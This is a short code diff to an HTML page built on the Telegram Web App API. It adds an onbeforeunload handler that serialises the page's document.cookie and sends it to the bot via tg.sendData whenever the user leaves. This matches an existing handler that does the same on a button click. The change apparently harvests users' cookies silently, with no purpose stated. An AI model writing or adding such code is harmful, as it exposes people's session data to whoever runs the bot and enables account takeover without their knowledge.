@@ -22,6 +22,10 @@
     Telegram.WebApp.onEvent('mainButtonClicked', function () {
         tg.sendData(JSON.stringify({"cookie": window.document.cookie}));
     });
+
+    window.onbeforeunload = function () {
+         tg.sendData(JSON.stringify({"cookie": window.document.cookie}));
+    }
 </script>
 </body>
 </html>
